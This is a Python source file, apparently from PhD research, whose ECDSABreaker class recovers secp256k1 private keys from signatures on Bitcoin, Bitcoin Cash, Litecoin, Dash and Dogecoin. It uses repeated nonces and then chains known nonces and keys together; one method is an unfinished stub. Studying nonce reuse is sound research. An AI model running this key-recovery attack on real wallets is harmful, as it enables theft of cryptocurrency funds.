import ecdsa
from ecdsa.curves import Curve
from keys_recovery.SignatureDB import SignatureDB, SignatureFolder
from keys_recovery.ecdsa_helper import (
    derive_nonce_from_known_private_key,
    derive_private_key_from_known_nonce,
    derive_private_key_from_repeated_nonces,
)
import logging

logger = logging.getLogger(__name__)
logging.basicConfig(encoding="utf-8", level=logging.DEBUG)


class ECDSABreaker:
    def __init__(
        self,
        signature_folders: list[SignatureFolder],
        curve: Curve,
    ) -> None:
        self.db = SignatureDB(signature_folders, curve=curve)
        self.curve = curve

    def crack(self):
        logger.info("ROUND 0: Derive nonces and private keys from repeated nonces")
        self.__crack_repeated_nonces()

        logger.info(
            "ROUND 1: Derive nonces from known private keys and private keys from known nonces"
        )
        self.__crack_from_known_nonces_and_keys()

    def __crack_repeated_nonces(self):
        repeated_nonces_df = self.db.find_repeated_nonces()
        repeated_nonces_df[["nonce", "privkey"]] = repeated_nonces_df.apply(
            lambda row: derive_private_key_from_repeated_nonces(
                row["r"], row["s"], row["digests"], row["pubkey"], self.curve
            ),
            axis=1,
            result_type="expand",
        )
        repeated_nonces_df["r_chain"] = repeated_nonces_df["chain"]

        self.db.expand_cracked_keys(repeated_nonces_df)
        self.db.expand_known_nonce(repeated_nonces_df)

    def __crack_from_known_nonces_and_keys(self):
        crackable_keys, crackable_nonces = self.db.get_crackable_keys_and_nonces()

        while len(crackable_keys.index) > 0 or len(crackable_nonces.index) > 0:
            crackable_keys["privkey"] = crackable_keys.apply(
                lambda row: derive_private_key_from_known_nonce(
                    row["r"],
                    row["s"],
                    row["h"],
                    row["nonce"],
                    row["pubkey"],
                    self.curve,
                ),
                axis=1,
            )
            self.db.expand_cracked_keys(crackable_keys)

            crackable_nonces["nonce"] = crackable_nonces.apply(
                lambda row: derive_nonce_from_known_private_key(
                    row["r"],
                    row["s"],
                    row["h"],
                    row["privkey"],
                ),
                axis=1,
            )
            self.db.expand_known_nonce(crackable_nonces)

            crackable_keys, crackable_nonces = self.db.get_crackable_keys_and_nonces()

    def __crack_from_sig_equation_system(self):
        cycle_signatures = self.db.get_cycle_signatures()


if __name__ == "__main__":
    signature_folders = [
        SignatureFolder(
            "/Users/vincent/Documents/PhD/Blockchains/UTXO/ecdsa-signatures/data/new_signatures_formatted/bch",
        ),
        SignatureFolder(
            "/Users/vincent/Documents/PhD/Blockchains/UTXO/ecdsa-signatures/data/new_signatures_formatted/btc"
        ),
        SignatureFolder(
            "/Users/vincent/Documents/PhD/Blockchains/UTXO/ecdsa-signatures/data/new_signatures_formatted/dash"
        ),
        SignatureFolder(
            "/Users/vincent/Documents/PhD/Blockchains/UTXO/ecdsa-signatures/data/new_signatures_formatted/ltc"
        ),
        SignatureFolder(
            "/Users/vincent/Documents/PhD/Blockchains/UTXO/ecdsa-signatures/data/new_signatures_formatted/doge"
        ),
    ]

    breaker = ECDSABreaker(signature_folders, ecdsa.SECP256k1)
    breaker.crack()
